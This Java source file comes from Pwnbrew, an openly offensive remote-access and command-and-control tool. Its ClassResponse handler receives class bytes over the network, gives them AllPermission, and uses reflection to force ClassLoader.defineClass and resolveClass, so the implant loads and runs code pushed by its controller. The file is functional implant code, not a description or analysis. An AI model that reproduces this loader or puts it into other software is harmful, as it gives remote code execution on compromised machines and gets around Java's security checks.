/*

Copyright (C) 2013-2014, Securifera, Inc 

All rights reserved. 

Redistribution and use in source and binary forms, with or without modification, 
are permitted provided that the following conditions are met:

    * Redistributions of source code must retain the above copyright notice,
	this list of conditions and the following disclaimer.

    * Redistributions in binary form must reproduce the above copyright notice,
	this list of conditions and the following disclaimer in the documentation 
	and/or other materials provided with the distribution.

    * Neither the name of Securifera, Inc nor the names of its contributors may be 
	used to endorse or promote products derived from this software without specific
	prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS 
OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY 
AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER 
OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR 
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, 
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

================================================================================

Pwnbrew is provided under the 3-clause BSD license above.

The copyright on this package is held by Securifera, Inc

*/

package pwnbrew.network.control.messages;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Arrays;
import java.util.logging.Level;
import pwnbrew.ClientConfig;
import pwnbrew.log.RemoteLog;
import pwnbrew.manager.PortManager;
import pwnbrew.network.ControlOption;
import pwnbrew.network.PortRouter;
import pwnbrew.network.control.ControlMessageManager;

/**
 *
 *  
 */
@SuppressWarnings("ucd")
public final class ClassResponse extends ControlMessage{
    
    private static final byte OPTION_MSG_TO_RESEND = 91;
    private static final byte OPTION_CLASS_BYTES = 92;
    
    private byte[] theClassBytes = null;
    private byte[] theMsgBytes = null;
    
     //Class name
    private static final String NAME_Class = ClassResponse.class.getSimpleName();    

    // ==========================================================================
    /**
     * Constructor
     *
     * @param passedId
    */
    public ClassResponse(byte[] passedId ) {
        super( passedId );
    }
    
    //=========================================================================
    /**
     *  Sets the variable in the message related to this TLV
     * 
     * @param tempTlv 
     * @return  
     */
    @Override
    public boolean setOption( ControlOption tempTlv ){        

        boolean retVal = true;    
        if( !super.setOption(tempTlv)){
            
            byte[] theValue = tempTlv.getValue();
            switch( tempTlv.getType()){
                case OPTION_CLASS_BYTES:
                    theClassBytes = Arrays.copyOf(theValue, theValue.length);
                    break;
                case OPTION_MSG_TO_RESEND:
                    theMsgBytes = Arrays.copyOf(theValue, theValue.length);
                    break;
                default:
                    retVal = false;
                    break;
            }           
        }
        return retVal;
    }
    
    //===============================================================
    /**
    *   Performs the logic specific to the message.
    *
     * @param passedManager
    */
    @Override
    public void evaluate( PortManager passedManager ) {
    
        int classLength = theClassBytes.length;
        if(classLength > 0 ){
            
            //Load the class and resolve it
            try {
                Permissions localPermissions = new Permissions();
                localPermissions.add(new AllPermission());
                ProtectionDomain localProtectionDomain = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), localPermissions);
                       
                try {

                    //Get the class loader
                    ClassLoader systemLoader = ClassLoader.getSystemClassLoader();
                    Class systemClass = ClassLoader.class;
                    
                    //Set the params for define class
                    Class[] classParams = new Class[]{String.class, byte[].class, int.class, int.class, ProtectionDomain.class};
                    Method systemMethod = systemClass.getDeclaredMethod("defineClass",  classParams);
                    //Set the method to accessible
                    systemMethod.setAccessible(true);
                    //Invoke the method
                    Object anObj = systemMethod.invoke(systemLoader, new Object[]{ null, theClassBytes, 0, classLength, localProtectionDomain });
                    if( anObj instanceof Class ){
                        //Cast to new class
                        Class aClass = (Class)anObj;
                        classParams = new Class[]{ Class.class };
                        systemMethod = systemClass.getDeclaredMethod("resolveClass",  classParams);
                        
                        //Set the method to accessible
                        systemMethod.setAccessible(true);
                        
                        //Invoke
                        systemMethod.invoke(systemLoader, new Object[]{ aClass });
                        
                        //Process the original message
                        ControlMessageManager aCMM = ControlMessageManager.getControlMessageManager();
                        if( aCMM != null ){
                            //Get the port
                            ClientConfig aConf = ClientConfig.getConfig();
                            int socketPort = aConf.getSocketPort();
                            
                            //Get the port router
                            PortRouter aPR = passedManager.getPortRouter(socketPort);
                            aCMM.handleMessage( aPR, theMsgBytes );
                        }
                    }
        
                } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException | SecurityException ex) {
                    RemoteLog.log(Level.SEVERE, NAME_Class, "loadJar()", ex.getMessage(), ex );
                }
          
            } catch( MalformedURLException ex){
                
            }
        }
            
    }

}
